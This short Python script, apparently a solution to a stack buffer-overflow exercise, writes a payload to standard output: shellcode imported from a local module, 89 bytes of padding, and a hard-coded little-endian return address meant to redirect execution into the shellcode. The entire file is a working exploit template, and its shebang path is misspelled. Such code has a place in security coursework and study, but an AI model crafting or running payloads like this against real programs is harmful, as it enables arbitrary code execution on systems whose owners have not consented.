#!/user/bin/env python3

import sys
from shellcode import shellcode

returnAdd = ( b'\x30'*89 + b'\x1c\xe8\xfe\xff')

sys.stdout.buffer.write( shellcode  + returnAdd )